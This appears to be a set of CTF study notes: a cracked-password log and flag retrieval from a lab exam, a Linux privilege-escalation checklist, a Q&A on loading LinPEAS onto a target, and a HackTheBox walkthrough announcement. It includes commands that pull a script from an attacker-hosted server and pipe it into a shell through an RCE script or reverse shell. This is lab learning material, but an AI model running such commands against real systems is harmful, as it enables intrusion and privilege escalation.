Loaded 2 password hashes with 2 different salts (crypt, generic crypt(3) [?/64])
Cost 1 (algorithm [1:descrypt 2:md5crypt 3:sunmd5 4:bcrypt 5:sha256crypt 6:sha512crypt]) is 0 for all loaded hashes
Cost 2 (algorithm specific iterations) is 1 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
shujaa2024       (examadmin)     
1g 0:00:00:25 DONE (2026-03-07 07:36) 0.03849g/s 155.6p/s 159.3c/s 159.3C/s multi..like
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

20. Retrieve the  flag.txt from the examadmin user’s home directory. (2 mks)

```shell
examuser@midexam:~$ su examadmin
Password: 
examadmin@midexam:/home/examuser$ ls
ls: cannot open directory '.': Permission denied
examadmin@midexam:/home/examuser$ cd 
examadmin@midexam:~$ ls
flag.txt
examadmin@midexam:~$ cat flag.txt
shujaa{r00t_pr1v_3sc4l4t10n_m4st3r}
examadmin@midexam:~$ 
```

---

## Random


## Standard PrivEsc Enumeration

|                            |                                      |                                                |
| -------------------------- | ------------------------------------ | ---------------------------------------------- |
| First checks (quick wins)  | can we run anything as root?         | `sudo -l`                                      |
|                            | what groups are we in?               | `id`                                           |
|                            | scheduled jobs running as root?      | `cat /etc/crontab `                            |
| SUID/GUID binaries         | files that run as their owner        | `find / -perm -4000 2>/dev/null `              |
| Running processes          | spot unusual root processes          | `ps aux`                                       |
| Writable files/directories |                                      | `find / -writable 2>/dev/null \| grep -v proc` |
| Automated tools:           | covers all of the above and more<br> | `./linpeas.sh `                                |



how can I run /.linpeas.sh

First you need to get the script onto the target. A few ways:

Option 1 — host it from Kali and wget/curl it on the target:

On Kali:
download linpeas if you don't have it
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh -o linpeas.sh

host it
python3 -m http.server 8080

On the target (via your reverse shell):
cd /tmp
wget http://10.10.14.85:8080/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh

Option 2 — run it directly without writing to disk:
curl http://10.10.14.85:8080/linpeas.sh | sh

Option 3 — via your rce script (no shell yet):
python3 rce3.py "curl http://10.10.14.85:8080/linpeas.sh | sh"

Note: LinPEAS produces a lot of output. If you're running it through rce3.py the 5 second timeout will cut it off. It works best inside an interactive reverse shell where you can scroll through the full output — the interesting findings are color coded in red/yellow.




🚩CTF WALKTHROUGH: HACKTHEBOX - CONNECTED

This week, we are taking on **Enigma**, a fresh, Easy-difficulty machine straight out of HackTheBox Season 11. Easy boxes are fantastic for fine-tuning your baseline scanning methodology, spotting subtle misconfigurations, and sharpening your initial exploitation speed. Whether you’ve already rooted it and want to share your perspective, or you're stuck and looking for that crucial breakthrough hint, this session is built for you!

Terrence (nedmoeca) will be leading the charge, so bring your analytical mindset, bring your terminal, and let's collaborate, talk strategy, and hunt down these flags together in real-time. 🚀

### 📅 Event & Machine Details

- **Session Lead:** Terrence (nedmoeca on HTB)
    
- **When:** Wednesday, 1st Jul 2026
    
- **Add to Calendar:** insert
    
- **Where:** [bit.ly/shujaawalkthroughs](https://www.google.com/search?q=https://bit.ly/shujaawalkthroughs)
    
- **Machine/Sherlock/Fortress:** Machine - Enigma
    
- **Platform:** HackTheBox
    
- **HTB Season:** 11
    
- **Target Link:** insert
    
- **Difficulty:** Easy
    

### ⚠️ Important Note Regarding Recordings

> **Please Note:** To strictly respect HackTheBox rules regarding active season machines, this session will be recorded but the footage **will not be posted publicly until Enigma is officially retired**. Come hang out with us live to get the full walkthrough, interact with the crew, and participate in the live Q&A!

See you all in the lab. Let's solve the Enigma! 🏴‍☠️🔥